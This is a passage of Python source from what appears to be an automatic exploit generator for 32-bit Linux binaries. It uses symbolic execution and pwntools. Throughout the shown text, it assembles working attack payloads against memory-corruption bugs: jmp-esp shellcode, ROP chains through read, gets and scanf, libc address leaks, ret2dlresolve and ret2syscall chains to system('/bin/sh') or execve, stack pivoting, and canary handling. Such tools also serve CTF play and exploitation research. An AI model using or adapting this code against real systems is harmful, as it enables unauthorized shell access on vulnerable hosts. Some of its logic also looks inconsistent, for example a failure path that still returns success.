        input_payload = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0, needline=needline,
            avoidchars=avoidchars
        )
        state = self.statelog.state
        state_bak = state.copy()
        can_load, address = self.LoadDataAndFindAddress(
            single_payload=input_payload, direction="backward",
            privilege="rw", need_check_align=True
        )
        if not can_load:
            self.statelog.state = state_bak
            return False
        address_element = PayloadElement(
            datavalue=address - 4, adjustinfo="elf_base", datatype="int32"
        )
        final_payload = []
        final_payload.append(address_element)
        leave_ret_gadget = self.gadgetservice.FindInstructionGadget(instruction="leave;ret")
        final_payload.append(PayloadElement(
            datavalue=leave_ret_gadget.address, adjustinfo="elf_base", datatype="int32"
        ))
        self.OptimizeForROP(payload=final_payload, adjustcanary=True, have_ebp=True)
        singlepayload = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0 + self.canary_offset_ebp, needline=0,
            avoidchars=self.avoidchars
        )

        state = self.statelog.state
        copystate = state.copy()
        # state.add_constraints(state.regs.eip == ret_gadget.address)
        address = state.solver.eval(state.regs.esp)
        address -= 8 # this is for ret instruction, and also the ebp
        can_load = self.TryLoadPayloadForAddress(
            address=address, single_payload=singlepayload
        )
        if state.satisfiable() and can_load:
            if haverecvlibc:
                self.GenerateFinalPayload(singlepayload=None)
            else:
                self.GenerateFinalPayloadNoRecv(singlepayload=None)
            self.statelog.need_send = True
            self.statelog.need_send_payload = need_send_payload
            log.success("successfully generate a payload in LoadInputPayloadForGeneralCheck")
            return True
        else:
            log.info("cannot successfully generate a payload in LoadInputPayloadForGeneralCheck")
            self.statelog.state = copystate
            return False

    def JmpEspPayloadGenerate(self):
        """
        use jmp to directly jump to shellcode in the stack
        :return: True when success generated, False when failed
        """
        if self.NX:
            return False
        jmp_esp_gadget = self.gadgetservice.FindJmpGadget(register="esp")
        if jmp_esp_gadget is None:
            return False
        final_payload = []
        final_payload.append(PayloadElement(
            datavalue=jmp_esp_gadget.address, adjustinfo="elf_base", datatype="int32"
        ))
        final_payload.append(PayloadElement(
            datavalue=self.GenerateShellcode(), adjustinfo=None, datatype="bytes"
        ))
        final_payload_canary = final_payload[:]
        self.OptimizeForROP(payload=final_payload, adjustcanary=False)
        self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
        singlepayload = SinglePayload(
            content=final_payload, length=self.needlength,
            prefixlength=self.prefixlength, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_load = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0, needline=False,
            avoidchars=b""
        )
        singlepayload_canary = SinglePayload(
            content=final_payload_canary, length=self.needlength,
            prefixlength=self.prefixlength + self.canary_offset_ebp, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_canary_load = SinglePayload(
            content=final_payload_canary, length=0,
            prefixlength=self.canary_offset_ebp, needline=False,
            avoidchars=b""
        )
        if singlepayload.BeforeAdjustCheck():
            # self.payloadlist.AppendPayload(single_payload)
            self.HandleFinalPayload(singlepayload=singlepayload,
                                    singlepayload_load=singlepayload_load,
                                    singlepayload_canary=singlepayload_canary,
                                    singlepayload_canary_load=singlepayload_canary_load,
                                    haverecvlibc=False,
                                    issystemroppayload=False
                                    )
            log.info("successfully use jmp esp method generate")
            return True
        log.info("cannot successfully generate jmp esp payload in JmpEspPayloadGenerate")
        return False

    def InputROPPayloadGenertate(self, address_element=PayloadElement(),
            length=0, return_element=PayloadElement(), need_pop=False):
        """
        use input functions to generate rop payload
        for example, read(0, address, length)
        :param address_element: the address you want to input, must in Payload element format
        :param length: the length of the input
        :param return_element: the return content element,
        if need_pop is True: this parameter has no meaning
        :param need_pop: if need_pop, should pop the parameter in the stack first
        :return: payloadlist, avoidchars, needline
        """
        if self.function_helper.CheckHaveFunction("read"):
            function_address = self.function_helper.GetFunctionAddress(func_name="read")
            final_payload = []
            final_payload.append(PayloadElement(
                datavalue=function_address, adjustinfo="elf_base", datatype="int32"
            ))
            if not need_pop:
                final_payload.append(return_element)
            else:
                pop3_gadget = self.gadgetservice.FindPopNumberGadget(number=3)
                final_payload.append(PayloadElement(
                    datavalue=pop3_gadget.address, adjustinfo="elf_base", datatype="int32"
                ))
            final_payload.append(PayloadElement(
                datavalue=0, adjustinfo=None, datatype="int32"
            ))
            final_payload.append(address_element)
            final_payload.append(PayloadElement(
                datavalue=length, adjustinfo=None, datatype="int32"
            ))
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength, needline=self.needline,
                avoidchars=self.avoidchars
            )
            self.OptimizeForROP(payload=final_payload, adjustcanary=False)
            # self.AvoidUbuntuVersionError(payload=final_payload)
            avoidchars = b""
            needline = False
            if not singlepayload.BeforeAdjustCheck():
                log.info("read funtion input rop generate failed")
            else:
                return final_payload, avoidchars, needline
        if self.function_helper.CheckHaveFunction("gets"):
            function_address = self.function_helper.GetFunctionAddress(func_name="gets")
            final_payload = []
            final_payload.append(PayloadElement(
                datavalue=function_address, adjustinfo="elf_base", datatype="int32"
            ))
            if not need_pop:
                final_payload.append(return_element)
            else:
                pop1_gadget = self.gadgetservice.FindPopNumberGadget(number=1)
                final_payload.append(PayloadElement(
                    datavalue=pop1_gadget.address, adjustinfo="elf_base", datatype="int32"
                ))
            final_payload.append(address_element)
            self.OptimizeForROP(payload=final_payload, adjustcanary=False)
            avoidchars = b"\n"
            needline = True
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength, needline=self.needline,
                avoidchars=self.avoidchars
            )
            if not singlepayload.BeforeAdjustCheck():
                log.info("gets funtion input rop generate failed")
            else:
                return final_payload, avoidchars, needline
        if self.function_helper.CheckHaveFunction("scanf"):
            function_address = self.function_helper.GetFunctionAddress(func_name="scanf")
            final_payload = []
            final_payload.append(PayloadElement(
                datavalue=function_address, adjustinfo="elf_base", datatype="int32"
            ))
            if not need_pop:
                final_payload.append(return_element)
            else:
                pop2_gadget = self.gadgetservice.FindPopNumberGadget(number=2)
                final_payload.append(PayloadElement(
                    datavalue=pop2_gadget.address, adjustinfo="elf_base", datatype="int32"
                ))
            try:
                final_payload.append(PayloadElement(
                    datavalue=next(self.elf.search(b"%s\x00")),
                    adjustinfo="elf_base", datatype="int32"
                ))
            except:
                log.Exception("cannot find %s format, cannot generate")
                return False
            final_payload.append(address_element)
            self.OptimizeForROP(payload=final_payload, adjustcanary=False)
            avoidchars = b"\n\x20"
            needline = True
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength, needline=self.needline,
                avoidchars=self.avoidchars
            )
            if not singlepayload.BeforeAdjustCheck():
                log.info("scanf funtion input rop generate failed")
            else:
                return final_payload, avoidchars, needline
        log.Exception("cannot successfully generate input payload, please check it")
        return None, b"", False

    def CheckPayloadLength(self, singlepayload=SinglePayload()):
        """
        check the payload's length, if length is not enough, return False
        if enough, return True
        :param singlepayload: the payload we need to check
        :return: True when enough, False when not
        """
        if singlepayload is None:
            log.Exception("single payload generate failed in CheckPayloadLength, please check it")
            return False
        if singlepayload.GetContentLength() == 0:
            log.Exception("single payload generate failed in CheckPayloadLength, please check it")
            return False
        payloadlength = singlepayload.GetContentLength()
        if self.needlength != 0:
            if self.needlength >= payloadlength + singlepayload.prefixlength:
                return True
            else:
                return False
        else:
            return True

    def GenerateLeakPayload(self, leak_address=0, adjustinfo="code_base"):
        """
        generally used to gernerate a leak address payload
        :param leak_address: the address want to leak
        :return: return payload or None when failed
        """
        final_payload = []
        pop1_gadget = self.gadgetservice.FindPopNumberGadget(number=1)
        if self.function_helper.CheckHaveFunction("puts"):
            function_address = self.function_helper.GetFunctionAddress(func_name="puts")
            final_payload.append(PayloadElement(
                datavalue=self.elf.plt["puts"], adjustinfo="elf_base", datatype="int32"
            ))
            final_payload.append(PayloadElement(
                datavalue=pop1_gadget.address, adjustinfo="elf_base", datatype="int32"
            ))
            final_payload.append(PayloadElement(
                datavalue=leak_address, adjustinfo=adjustinfo, datatype="int32"
            ))
            return final_payload
        elif self.function_helper.CheckHaveFunction("printf"):
            function_address = self.function_helper.GetFunctionAddress(func_name="printf")
            final_payload.append(PayloadElement(
                datavalue=function_address, adjustinfo="elf_base", datatype="int32"
            ))
            final_payload.append(PayloadElement(
                datavalue=pop1_gadget.address, adjustinfo="elf_base", datatype="int32"
            ))
            final_payload.append(PayloadElement(
                datavalue=leak_address, adjustinfo=adjustinfo, datatype="int32"
            ))
            return final_payload
        elif self.function_helper.CheckHaveFunction("write"):
            function_address = self.function_helper.GetFunctionAddress(func_name="write")
            pop3_gadget = self.gadgetservice.FindPopNumberGadget(number=3)
            final_payload.append(PayloadElement(
                datavalue=function_address, adjustinfo="elf_base", datatype="int32"
            ))
            final_payload.append(PayloadElement(
                datavalue=pop3_gadget.address, adjustinfo="elf_base", datatype="int32"
            ))
            final_payload.append(PayloadElement(
                datavalue=1, adjustinfo=None, datatype="int32"
            ))
            final_payload.append(PayloadElement(
                datavalue=leak_address, adjustinfo=adjustinfo, datatype="int32"
            ))
            final_payload.append(PayloadElement(
                datavalue=4, adjustinfo=None, datatype="int32"
            ))
            return final_payload
        else:
            return None

    def GenerateFinalPayloadNoRecv(self, singlepayload=None,
                                   need_send_payload=SinglePayload(),
                                   need_send=False):
        """
        generate the final payload before return
        because we need to judge which payload to add the recv info
        and we need to judge the payload of strcpy
        :param singlepayload: the original payload generated
        :param need_send_payload: the payload for send
        :param need_send: if we have some payload need send in the final, set it True,
        otherwise set it false
        :return: None
        """
        if self.statelog.functionname != "general_check" and singlepayload is None:
            # if this is a general check vulnerability, single payload can be None
            log.Exception("singel payload is None, please check it")
            return False
        scanfinfo = self.statelog.scanfinfo
        strcpyinfo = self.statelog.strcpyinfo
        func_list = ["strcpy", "strncpy"]
        suffix_length = 0
        inargv = False
        infile = False
        if strcpyinfo is not None:
            suffix_begin_index = strcpyinfo.suffix_payload_begin_index
            suffix_end_index = strcpyinfo.suffix_payload_end_index
            suffix_length = suffix_end_index - suffix_begin_index
            inargv = strcpyinfo.inargv
            infile = strcpyinfo.infile
        if self.statelog.functionname == "scanf" and \
                scanfinfo.overflow_index + 1 < len(scanfinfo.formats):
            self.payloadlist.AppendPayload(singlepayload)
            singlepayload_scanf = self.ParseScanfSuffixPayload()
            self.payloadlist.AppendPayload(singlepayload_scanf)
            if need_send:
                self.payloadlist.AppendPayload(need_send_payload)
        elif self.statelog.functionname in func_list:
            if inargv:
                singlepayload.PlacePayloadInArgv(argv_index=strcpyinfo.argv_index)
                self.payloadlist.AppendPayload(singlepayload)
                return
            if infile:
                state = self.statelog.state
                file_id = strcpyinfo.file_fd
                singlepayload.PlacePayloadInFile(file_name=state.posix.fd[file_id].file.name)
                self.payloadlist.AppendPayload(singlepayload)
                return
            if suffix_length == 0:
                if self.statelog.functionname in func_list:
                    output_length = strcpyinfo.output_end_index - strcpyinfo.output_begin_index
                    if output_length != 0:
                        all_output = self.statelog.state.posix.dumps(sys.stdout.fileno())
                        output_info = all_output[strcpyinfo.output_begin_index:strcpyinfo.output_end_index]
                        singlepayload.AddRecvInfo(
                            type="string", recv_index=[strcpyinfo.output_begin_index, output_info],
                            func="bytes", adjustoffset=None
                        )
                self.payloadlist.AppendPayload(singlepayload)
                if need_send:
                    self.payloadlist.AppendPayload(need_send_payload)
                return
            self.payloadlist.AppendPayload(singlepayload)
            all_input = self.statelog.state.posix.dumps(sys.stdin.fileno())
            payload = [PayloadElement(
                datavalue=all_input[suffix_begin_index:suffix_end_index], adjustinfo=None, datatype="bytes")]
            singlepayload_strcpy = SinglePayload(
                content=payload, length=suffix_length,
                prefixlength=0
            )
            output_length = strcpyinfo.output_end_index - strcpyinfo.output_begin_index
            all_output = self.statelog.state.posix.dumps(sys.stdout.fileno())
            output_info = all_output[strcpyinfo.output_begin_index:strcpyinfo.output_end_index]
            if output_length != 0:
                singlepayload_strcpy.AddRecvInfo(
                    type="string", recv_index=[strcpyinfo.output_begin_index, output_info],
                    func="bytes", adjustoffset=None
                )
            self.payloadlist.AppendPayload(singlepayload_strcpy)
            if need_send:
                self.payloadlist.AppendPayload(need_send_payload)
        elif self.statelog.functionname == "general_check":
            pass
        else:
            self.payloadlist.AppendPayload(singlepayload)
            if need_send:
                self.payloadlist.AppendPayload(need_send_payload)
            return

    def GenerateFinalPayload(self, singlepayload=None,
                             need_send_payload=SinglePayload(),
                             need_send=False):
        """
        generate the final payload before return
        because we need to judge which payload to add the recv info
        :param singlepayload: the original payload generated
        :param need_send_payload: the payload for send
        :param need_send: if we have some payload need send in the final, set it True,
        otherwise set it false
        :return: None
        """
        if self.statelog.functionname != "general_check" and singlepayload is None:
            # if this is a general check vulnerability, single payload can be None
            log.Exception("singel payload is None, please check it")
            return False
        scanfinfo = self.statelog.scanfinfo
        strcpyinfo = self.statelog.strcpyinfo
        func_list = ["strcpy", "strncpy"]
        suffix_length = 0
        inargv = False
        if strcpyinfo is not None:
            suffix_begin_index = strcpyinfo.suffix_payload_begin_index
            suffix_end_index = strcpyinfo.suffix_payload_end_index
            suffix_length = suffix_end_index - suffix_begin_index
            inargv = strcpyinfo.inargv
            infile = strcpyinfo.infile
        if self.statelog.functionname == "scanf" and \
                scanfinfo.overflow_index + 1 < len(scanfinfo.formats):
            self.payloadlist.AppendPayload(singlepayload)
            singlepayload_scanf = self.ParseScanfSuffixPayload()
            if need_send:
                need_send_payload.AddRecvInfo(
                    type="libc_base", recv_index=[0, 4], func="u32",
                    adjustoffset=-self.libc.symbols["__libc_start_main"]
                )
            else:
                singlepayload_scanf.AddRecvInfo(
                    type="libc_base", recv_index=[0, 4], func="u32",
                    adjustoffset=-self.libc.symbols["__libc_start_main"]
                )
            self.payloadlist.AppendPayload(singlepayload_scanf)
            if need_send:
                self.payloadlist.AppendPayload(need_send_payload)
        elif self.statelog.functionname in func_list:
            if inargv:
                singlepayload.PlacePayloadInArgv(argv_index=strcpyinfo.argv_index)
                self.payloadlist.AppendPayload(singlepayload)
                return
            if infile:
                singlepayload.PlacePayloadInFile(argv_index=strcpyinfo.argv_index)
                self.payloadlist.AppendPayload(singlepayload)
                return
            if suffix_length == 0:
                if self.statelog.functionname in func_list:
                    output_length = strcpyinfo.output_end_index - strcpyinfo.output_begin_index
                    if output_length != 0:
                        all_output = self.statelog.state.posix.dumps(sys.stdout.fileno())
                        output_info = all_output[strcpyinfo.output_begin_index:strcpyinfo.output_end_index]
                        singlepayload.AddRecvInfo(
                            type="string", recv_index=[strcpyinfo.output_begin_index, output_info],
                            func="bytes", adjustoffset=None
                        )
                if need_send:
                    need_send_payload.AddRecvInfo(
                        type="libc_base", recv_index=[0, 4], func="u32",
                        adjustoffset=-self.libc.symbols["__libc_start_main"]
                    )
                else:
                    singlepayload.AddRecvInfo(
                        type="libc_base", recv_index=[0, 4], func="u32",
                        adjustoffset=-self.libc.symbols["__libc_start_main"]
                    )
                self.payloadlist.AppendPayload(singlepayload)
                if need_send:
                    self.payloadlist.AppendPayload(need_send_payload)
                return
            self.payloadlist.AppendPayload(singlepayload)
            all_input = self.statelog.state.posix.dumps(sys.stdin.fileno())
            payload = [PayloadElement(
                datavalue=all_input[suffix_begin_index:suffix_end_index], adjustinfo=None, datatype="bytes")]
            singlepayload_strcpy = SinglePayload(
                content=payload, length=suffix_length,
                prefixlength=0
            )
            output_length = strcpyinfo.output_end_index - strcpyinfo.output_begin_index
            all_output = self.statelog.state.posix.dumps(sys.stdout.fileno())
            output_info = all_output[strcpyinfo.output_begin_index:strcpyinfo.output_end_index]
            if output_length != 0:
                singlepayload_strcpy.AddRecvInfo(
                    type="string", recv_index=[strcpyinfo.output_begin_index, output_info],
                    func="bytes", adjustoffset=None
                )
            if need_send:
                self.payloadlist.AppendPayload(singlepayload_strcpy)
                need_send_payload.AddRecvInfo(
                    type="libc_base", recv_index=[0, 4], func="u32",
                    adjustoffset=-self.libc.symbols["__libc_start_main"]
                )
                self.payloadlist.AppendPayload(need_send_payload)
            else:
                singlepayload_strcpy.AddRecvInfo(
                    type="libc_base", recv_index=[0, 4], func="u32",
                    adjustoffset=-self.libc.symbols["__libc_start_main"]
                )
                self.payloadlist.AppendPayload(singlepayload_strcpy)
        elif self.statelog.functionname == "general_check":
            """
            all_input = self.statelog.state.posix.dumps(sys.stdin.fileno())
            all_output = self.statelog.state.posix.dumps(sys.stdout.fileno())
            payload = [PayloadElement(
                datavalue=all_input, adjustinfo=None, datatype="bytes")]
            singlepayload = SinglePayload(content=payload, length=len(all_input),
                prefixlength=self.prefixlength, needline=self.needline,
                avoidchars=self.avoidchars)
            singlepayload.AddRecvInfo(type="string", recv_index=[0, len(all_output)],
                    func="bytes", adjustoffset=None)
            self.payloadlist.AppendPayload(singlepayload)
            """
            # no need to add a single payload for this
            # because the payload has been added to the payload for path
            # in self.ParseStateLoadPath
            self.statelog.Changeneedrecvlibc()
        else:
            if need_send:
                need_send_payload.AddRecvInfo(
                    type="libc_base", recv_index=[0, 4], func="u32",
                    adjustoffset=-self.libc.symbols["__libc_start_main"]
                )
            else:
                singlepayload.AddRecvInfo(
                    type="libc_base", recv_index=[0, 4], func="u32",
                    adjustoffset=-self.libc.symbols["__libc_start_main"]
                )
            if need_send:
                self.payloadlist.AppendPayload(singlepayload)
                self.payloadlist.AppendPayload(need_send_payload)
            else:
                self.payloadlist.AppendPayload(singlepayload)

    def HandleFinalPayload(self, singlepayload=SinglePayload(),
                           singlepayload_load=SinglePayload(),
                           singlepayload_canary=SinglePayload(),
                           singlepayload_canary_load=SinglePayload(),
                           haverecvlibc=False,
                           issystemroppayload=False):
        """
        after generate a single payload, we need to handle this payload generate
        use different strategy for different situation
        :param singlepayload: the payload generated
        :param singlepayload_load: the payload for load
        :param singlepayload_canary: the single payload generated have canary
        :param singlepayload_canary_load: the single payload generated not have canary
        :param haverecvlibc: in some payload, we need to recv libc info
        :param issystemroppayload: If this is a rop payload, set it True, because we
        need to choose a place for a rop payload, for stack pivoting, the place
        must not be too near around the end of .bss or .data.
        :return: True when success, False when not
        """
        if self.statelog.functionname == "general_check":
            # load payload to some place and return
            if self.LoadPayloadForGeneralCheck(
                    single_payload=singlepayload,
                    singlepayload_canary=singlepayload_canary,
                    haverecvlibc=haverecvlibc,
                    issystemroppayload=issystemroppayload
            ):
                return True
            # load input payload first for the rop payload
            # thus we only need no canary payload
            if self.LoadInputPayloadForGeneralCheck(
                single_payload=singlepayload,
                haverecvlibc=haverecvlibc,
                issystemroppayload=issystemroppayload
            ):
                return True
            log.Exception("cannot generate payload for this general vulnerability")
            return False
        else:
            if self.CheckPayloadLength(singlepayload_canary):
                if haverecvlibc:
                    self.GenerateFinalPayload(singlepayload=singlepayload_canary)
                else:
                    self.GenerateFinalPayloadNoRecv(singlepayload=singlepayload_canary)
                return True
            # load payload to the return address and return, or use stack pivoting
            if self.LoadPayloadAndReturn(
                single_payload=singlepayload_load,
                single_payload_canary=singlepayload_canary_load,
                have_recv=haverecvlibc,
                issystemroppayload=issystemroppayload
            ):
                return True
            # sometimes the payload is too long and we can use this method
            if self.LoadInputPayloadAndReturn(
                single_payload=singlepayload_load,
                have_recv=haverecvlibc,
                issystemroppayload=issystemroppayload
            ):
                return True
            log.Exception("cannot handle payload generate in HandleFinalPayload")
            return False

    def Generate_dlruntime_resolve_Payload(self):
        """
        generate the payload with ret2_dlruntime_resolve method
        :return: True when success, False when not
        """
        pwn.context.binary = self.elf
        # rop = pwn.ROP(pwn.context.binary)
        dlresolve = pwn.Ret2dlresolvePayload(self.elf, symbol="system", args=["/bin/sh"])
        if dlresolve.unreliable:
            log.Exception("dlresolve data is unreliable in Generate_dlruntime_resolve_Payload, please check it")
            return False
        address = dlresolve.data_addr
        dlresolve_addr_element = PayloadElement(
            datavalue=address, adjustinfo="elf_base", datatype="int32"
        )
        dlresolve_data = dlresolve.payload
        final_payload, next_avoidchars, next_needline = self.InputROPPayloadGenertate(
            address_element=dlresolve_addr_element,
            length=len(dlresolve_data),
            need_pop=True
        )
        plt0_addr = self.statelog.project.loader.main_object.sections_map[".plt"].min_addr
        plt0_element = PayloadElement(
            datavalue=plt0_addr, adjustinfo="elf_base", datatype="int32"
        )
        final_payload.append(plt0_element)

        reloc_index_element = PayloadElement(
            datavalue=dlresolve.reloc_index, adjustinfo="None", datatype="int32"
        )
        final_payload.append(reloc_index_element)

        junk_element = PayloadElement(
            datavalue=0xdeadbeef, adjustinfo="elf_base", datatype="int32"
        )
        final_payload.append(junk_element)

        binsh_addr = dlresolve.data_addr + dlresolve.payload.index(b"/bin/sh")
        binsh_element = PayloadElement(
            datavalue=binsh_addr, adjustinfo="elf_base", datatype="int32"
        )
        final_payload.append(binsh_element)

        final_payload_canary = final_payload[:]
        self.OptimizeForROP(payload=final_payload, adjustcanary=False)
        self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
        singlepayload = SinglePayload(
            content=final_payload, length=self.needlength,
            prefixlength=self.prefixlength, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_load = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0, needline=False,
            avoidchars=b""
        )
        singlepayload_canary = SinglePayload(
            content=final_payload_canary, length=self.needlength,
            prefixlength=self.prefixlength + self.canary_offset_ebp, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_canary_load = SinglePayload(
            content=final_payload_canary, length=0,
            prefixlength=self.canary_offset_ebp, needline=False,
            avoidchars=b""
        )
        if not self.HandleFinalPayload(
                singlepayload=singlepayload,
                singlepayload_load=singlepayload_load,
                singlepayload_canary=singlepayload_canary,
                singlepayload_canary_load=singlepayload_canary_load,
                haverecvlibc=False,
                issystemroppayload=False  # input rop for shellcode
        ):
            log.info("cannot successfully generate payload in Generate_dlruntime_resolve_Payload")
            return False
        # self.payloadlist.AppendPayload(singlepayload)
        final_payload2 = [PayloadElement(
            datavalue=dlresolve_data, adjustinfo=None, datatype="bytes")]
        self.payloadlist.AppendPayload(SinglePayload(
            content=final_payload2, length=len(dlresolve_data),
            prefixlength=0, avoidchars=next_avoidchars,
            needline=next_needline
        ))
        return True

    def BackdoorPayloadGenerate(self):
        """
        find a backdoor and return
        :return: True when succeed, False when not
        """
        backdoorfind = BackDoorFinder(
            binary_path=self.binarypath, function_helper=self.function_helper)
        backdoors = backdoorfind.AnalyseBackdoorMain()
        if backdoors is None:
            return False
        if len(backdoors) == 0:
            return False
        log.success("find backdoor in this binary, just return it")
        backdoorentry = backdoors[0]["backdoorentry"]
        backdoorentry_element = PayloadElement(
            datavalue=backdoorentry, adjustinfo="elf_base", datatype="int32"
        )
        final_payload = []
        final_payload.append(backdoorentry_element)
        #self.AvoidUbuntuVersionError(payload=final_payload)
        final_payload_canary = final_payload[:]
        self.OptimizeForROP(payload=final_payload, adjustcanary=False)
        self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
        singlepayload = SinglePayload(
            content=final_payload, length=self.needlength,
            prefixlength=self.prefixlength, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_load = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0, needline=False,
            avoidchars=b""
        )
        singlepayload_canary = SinglePayload(
            content=final_payload_canary, length=self.needlength,
            prefixlength=self.prefixlength + self.canary_offset_ebp, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_canary_load = SinglePayload(
            content=final_payload_canary, length=0,
            prefixlength=self.canary_offset_ebp, needline=False,
            avoidchars=b""
        )
        if self.HandleFinalPayload(
                singlepayload=singlepayload,
                singlepayload_load=singlepayload_load,
                singlepayload_canary=singlepayload_canary,
                singlepayload_canary_load=singlepayload_canary_load,
                haverecvlibc=False,
                issystemroppayload=True  # system("/bin/sh") payload
        ):
            return True
        log.info("cannot generate payload in ROPPayloadStaticNXEnable_X64")
        return True

    def GeneratePayload_X86(self):
        """
        the is the main function for generating payload for x86(i386)
        :return: self.payloadlist
        """
        # self.ParseStatelogPath()
        if self.BackdoorPayloadGenerate():
            return True
        if self.static:
            # if it is a static bianry, maybe the canary check will be false
            if not self.NX:
                # no NX, no PIE
                # just generate shellcode and jmp esp first
                return self.ROPPayloadStaticNXDisable_X86()
            else:
                # NX enabled, or we cannot find the jmp rsp gadget
                # try to use a ROPchain to solve this problem
                # for static binary, use ret2syscall to solve this problem
                return self.ROPPayloadStaticNXEnable_X86()
        else:
            if not self.NX:
                # just generate shellcode and jmp esp first
                return self.ROPPayloadDynamicNXDisable_X86()
            else:
                # no NX, must use ROP to solve this problem
                return self.ROPPayloadDynamicNXEnable_X86()

    def ROPPayloadStaticNXDisable_X86(self):
        """
        if this binary has no nx protection, it's in this branch for x86(i386)
        1. check whether there is a PIE protection
        2. check whether there is a canary protection
        and set the final payloadlist into self.payloadlist
        :return: True when successfully generated, False when failed
        """
        method1 = self.JmpEspPayloadGenerate()
        if method1:
            return True
        method2 = self.LoadShellcodeAndReturn()
        if method2:
            return True
        method3 = self.ROPPayloadStaticNXEnable_X86()
        if method3:
            return True
        log.info("cannot generate payload in ROPPayloadStaticNXDisable_X86")
        return False

    def ROPPayloadStaticNXEnable_X86(self):
        """
        for NX enable, use ROP chain to solve this payload
        :return: True when success, False when not
        """
        method1 = self.LoadShellcodeAndReturn()
        if method1:
            return True
        if "system" in self.elf.symbols.keys():
            log.info("find a system symbol in this binary, just use this")
            havesystem = True
            system = self.elf.symbols["system"]
            system_element = PayloadElement(
                datavalue=system, adjustinfo="elf_base", datatype="int32"
            )
        else:
            log.info("no system in this binary, try to use ret2syscall")
            havesystem = False
            system = 0
            system_element = PayloadElement()
        try:
            log.info("find /bin/sh string in this binary")
            binsh = next(self.elf.search(b"/bin/sh"))
            binsh_element = PayloadElement(
                datavalue=binsh, adjustinfo="elf_base", datatype="int32")
            havebinsh = True
        except:
            log.info("cannot find /bin/sh string in this binary")
            binsh = 0
            binsh_element = PayloadElement()
            havebinsh = False
        # final_payload = b""
        if havesystem and havebinsh:
            log.info("have system and binsh in x86, just overwrite the return address and give a parameter")
            final_payload = []
            final_payload.append(system_element)
            final_payload.append(PayloadElement(
                datavalue=0, adjustinfo=None, datatype="int32"
            ))
            final_payload.append(binsh_element)
            # self.AvoidUbuntuVersionError(payload=final_payload)
            final_payload_canary = final_payload[:]
            self.OptimizeForROP(payload=final_payload, adjustcanary=False)
            self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength, needline=self.needline,
                avoidchars=self.avoidchars
            )
            singlepayload_load = SinglePayload(
                content=final_payload, length=0,
                prefixlength=0, needline=False,
                avoidchars=b""
            )
            singlepayload_canary = SinglePayload(
                content=final_payload_canary, length=self.needlength,
                prefixlength=self.prefixlength + self.canary_offset_ebp, needline=self.needline,
                avoidchars=self.avoidchars
            )
            singlepayload_canary_load = SinglePayload(
                content=final_payload_canary, length=0,
                prefixlength=self.canary_offset_ebp, needline=False,
                avoidchars=b""
            )
            if self.HandleFinalPayload(
                singlepayload=singlepayload,
                singlepayload_load=singlepayload_load,
                singlepayload_canary=singlepayload_canary,
                singlepayload_canary_load=singlepayload_canary_load,
                haverecvlibc=False,
                issystemroppayload=True # system("/bin/sh") payload
            ):
                return True
            log.info("cannot generate payload in ROPPayloadStaticNXEnable_X86")
            return False
        if not havesystem and havebinsh:
            log.info("have binsh but no system")
            log.info("for static binary, use the ret2syscall method to solve this")
            final_payload = []
            ebx_value = binsh_element
            ecx_value = PayloadElement(datavalue=0, adjustinfo=None, datatype="int32")
            edx_value = PayloadElement(datavalue=0, adjustinfo=None, datatype="int32")
            syscall_tab_value = PayloadElement(
                datavalue=pwn.constants.linux.i386.SYS_execve,
                adjustinfo=None, datatype="int32"
            )
            final_payload.extend(self.SyscallROPPayloadGenerate_X86(
                ebx=ebx_value, ecx=ecx_value, edx=edx_value,
                syscall_tab=syscall_tab_value))
            # self.AvoidUbuntuVersionError(final_payload)
            final_payload_canary = final_payload[:]
            self.OptimizeForROP(payload=final_payload, adjustcanary=False)
            self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength, needline=self.needline,
                avoidchars=self.avoidchars
            )
            singlepayload_load = SinglePayload(
                content=final_payload, length=0,
                prefixlength=0, needline=False,
                avoidchars=b""
            )
            singlepayload_canary = SinglePayload(
                content=final_payload_canary, length=self.needlength,
                prefixlength=self.prefixlength + self.canary_offset_ebp, needline=self.needline,
                avoidchars=self.avoidchars
            )
            singlepayload_canary_load = SinglePayload(
                content=final_payload_canary, length=0,
                prefixlength=self.canary_offset_ebp, needline=False,
                avoidchars=b""
            )
            if self.HandleFinalPayload(
                singlepayload=singlepayload,
                singlepayload_load=singlepayload_load,
                singlepayload_canary=singlepayload_canary,
                singlepayload_canary_load=singlepayload_canary_load,
                haverecvlibc=False,
                issystemroppayload=False #syscall is not system
            ):
                return True
            log.info("cannot generate payload in ROPPayloadStaticNXEnable_X86")
            return False
        if not havebinsh:
            # if no binsh in this binary, try to use read syscall to create a binsh
            # log.info("have system but no binsh")
            log.info("for static binary, use the ret2syscall method to solve this")
            # finish the read syscall payload
            binsh_addr = self.elf.bss()
            binsh_addr_element = PayloadElement(
                datavalue=binsh_addr, adjustinfo="elf_base",
                datatype="int32"
            )
            binsh_string = b"/bin/sh\x00"
            final_payload = []
            ebx_value = PayloadElement(
                datavalue=0, adjustinfo=None, datatype="int32"
            )
            ecx_value = binsh_addr_element
            edx_value = PayloadElement(
                datavalue=len(binsh_string), adjustinfo=None, datatype="int32"
            )
            syscall_tab_value = PayloadElement(
                datavalue=pwn.constants.linux.i386.SYS_read,
                adjustinfo=None, datatype="int32"
            )
            final_payload.extend(self.SyscallROPPayloadGenerate_X86(
                ebx=ebx_value, ecx=ecx_value, edx=edx_value,
